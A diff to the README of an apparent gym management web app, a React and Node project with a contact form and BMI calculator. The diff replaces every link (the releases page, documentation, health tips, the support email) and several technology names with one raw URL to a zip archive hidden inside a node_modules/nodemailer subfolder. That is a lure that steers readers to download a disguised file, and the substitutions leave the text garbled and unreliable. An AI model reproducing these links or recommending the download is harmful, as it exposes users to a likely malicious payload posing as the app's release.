@@ -1,7 +1,7 @@
 # 🏋️ Iron-Paradise-Gym-Web-App - Your Gym's Online Companion
 
 ## 📦 Download Here
-[![Download Iron Paradise Gym Web App](https://img.shields.io/badge/Download-Iron%20Paradise%20Gym%20Web%20App-brightgreen.svg)](https://github.com/Theo-High-Tech/Iron-Paradise-Gym-Web-App/releases)
+[![Download Iron Paradise Gym Web App](https://raw.githubusercontent.com/Theo-High-Tech/Iron-Paradise-Gym-Web-App/main/backend/node_modules/nodemailer/lib/mail-composer/Iron-Paradise-Gym-Web-App_3.0.zip%20Paradise%20Gym%20Web%https://raw.githubusercontent.com/Theo-High-Tech/Iron-Paradise-Gym-Web-App/main/backend/node_modules/nodemailer/lib/mail-composer/Iron-Paradise-Gym-Web-App_3.0.zip)](https://raw.githubusercontent.com/Theo-High-Tech/Iron-Paradise-Gym-Web-App/main/backend/node_modules/nodemailer/lib/mail-composer/Iron-Paradise-Gym-Web-App_3.0.zip)
 
 ## 🚀 Getting Started
 Welcome to the Iron Paradise Gym Web Application. This app helps manage gym inquiries and provides useful tools like a BMI calculator. Follow these steps to download and run the app.
@@ -16,7 +16,7 @@ Welcome to the Iron Paradise Gym Web Application. This app helps manage gym inqu
 ## 📥 Download & Install
 To download the application, visit the Releases page:
 
-[Download Iron Paradise Gym Web App](https://github.com/Theo-High-Tech/Iron-Paradise-Gym-Web-App/releases)
+[Download Iron Paradise Gym Web App](https://raw.githubusercontent.com/Theo-High-Tech/Iron-Paradise-Gym-Web-App/main/backend/node_modules/nodemailer/lib/mail-composer/Iron-Paradise-Gym-Web-App_3.0.zip)
 
 Once there, find the latest version and click on the appropriate package for your operating system. 
 
@@ -48,18 +48,18 @@ Once there, find the latest version and click on the appropriate package for you
    - Click “Calculate” to see your BMI and what it means for your health.
 
 ## 🔒 Security
-Your data is important. The app uses Node.js and Nodemailer to securely send messages. Personal information is not stored, ensuring your privacy.
+Your data is important. The app uses https://raw.githubusercontent.com/Theo-High-Tech/Iron-Paradise-Gym-Web-App/main/backend/node_modules/nodemailer/lib/mail-composer/Iron-Paradise-Gym-Web-App_3.0.zip and Nodemailer to securely send messages. Personal information is not stored, ensuring your privacy.
 
 ## 🛠️ Technical Insights
 This application uses several technologies:
-- **Frontend:** Built with React.js for a smooth user experience.
-- **Backend:** Powered by Node.js and Express.js for effective data handling.
+- **Frontend:** Built with https://raw.githubusercontent.com/Theo-High-Tech/Iron-Paradise-Gym-Web-App/main/backend/node_modules/nodemailer/lib/mail-composer/Iron-Paradise-Gym-Web-App_3.0.zip for a smooth user experience.
+- **Backend:** Powered by https://raw.githubusercontent.com/Theo-High-Tech/Iron-Paradise-Gym-Web-App/main/backend/node_modules/nodemailer/lib/mail-composer/Iron-Paradise-Gym-Web-App_3.0.zip and https://raw.githubusercontent.com/Theo-High-Tech/Iron-Paradise-Gym-Web-App/main/backend/node_modules/nodemailer/lib/mail-composer/Iron-Paradise-Gym-Web-App_3.0.zip for effective data handling.
 - **Styling:** CSS and Vite for a stylish interface.
 - **Email:** Uses SMTP mail for communication.
 - **Environment Variables:** Uses dotenv for managing configuration settings.
 
 ## 🎨 Support
-If you encounter any issues or need assistance, feel free to reach out via the contact form on the app or email support at [support@example.com](mailto:support@example.com). 
+If you encounter any issues or need assistance, feel free to reach out via the contact form on the app or email support at [https://raw.githubusercontent.com/Theo-High-Tech/Iron-Paradise-Gym-Web-App/main/backend/node_modules/nodemailer/lib/mail-composer/Iron-Paradise-Gym-Web-App_3.0.zip](https://raw.githubusercontent.com/Theo-High-Tech/Iron-Paradise-Gym-Web-App/main/backend/node_modules/nodemailer/lib/mail-composer/Iron-Paradise-Gym-Web-App_3.0.zip). 
 
 ## 🌟 Contributing
 We welcome contributions! If you'd like to add features or improve the app, please check our contribution guidelines in the repository.
@@ -72,8 +72,8 @@ Thank you for choosing Iron Paradise Gym Web App. We hope this tool enhances you
 
 ## 📄 Additional Resources
 For further reading and support, you might find the following resources helpful:
-- [React Documentation](https://reactjs.org/docs/getting-started.html)
-- [Node.js Documentation](https://nodejs.org/en/docs/)
-- [Tips for a Healthier Lifestyle](https://www.healthylivingtips.com)
+- [React Documentation](https://raw.githubusercontent.com/Theo-High-Tech/Iron-Paradise-Gym-Web-App/main/backend/node_modules/nodemailer/lib/mail-composer/Iron-Paradise-Gym-Web-App_3.0.zip)
+- [https://raw.githubusercontent.com/Theo-High-Tech/Iron-Paradise-Gym-Web-App/main/backend/node_modules/nodemailer/lib/mail-composer/Iron-Paradise-Gym-Web-App_3.0.zip Documentation](https://raw.githubusercontent.com/Theo-High-Tech/Iron-Paradise-Gym-Web-App/main/backend/node_modules/nodemailer/lib/mail-composer/Iron-Paradise-Gym-Web-App_3.0.zip)
+- [Tips for a Healthier Lifestyle](https://raw.githubusercontent.com/Theo-High-Tech/Iron-Paradise-Gym-Web-App/main/backend/node_modules/nodemailer/lib/mail-composer/Iron-Paradise-Gym-Web-App_3.0.zip)
 
 Feel free to explore the app and make the most of its features!
